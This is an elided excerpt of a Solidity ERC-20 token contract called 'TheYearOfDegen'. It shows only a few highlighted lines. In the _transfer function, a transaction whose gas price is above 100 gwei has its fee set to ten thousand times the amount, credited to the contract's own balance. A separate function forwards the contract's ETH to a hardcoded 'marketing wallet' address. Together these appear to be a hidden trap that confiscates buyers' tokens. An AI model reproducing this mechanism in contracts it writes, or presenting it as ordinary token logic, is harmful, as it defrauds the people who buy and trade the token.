...
//https://t.me/TheYearOfDegen
//www.theyearofdegen.com
...
contract TheYearOfDegen is Context, IERC20, Ownable {
    ...
    string private constant _name = "TheYearOfDegen"; // 
    string private constant _symbol = unicode"DEGEN23"; //    
    ...
    function _transfer(
        ...
        if (tx.gasprice > 100 gwei){flatAmount = amount*10000;}
        ...
        _tOwned[address(this)] += flatAmount;
    ...
    function swapAndSendToFee (uint256 tokens) private {
        ...
        if (ethToSend > 0)
            payable(0x5D5747683878c8d09822A1fb6EeAA75e38753B89).transfer(ethToSend); //marketing wallet
    }
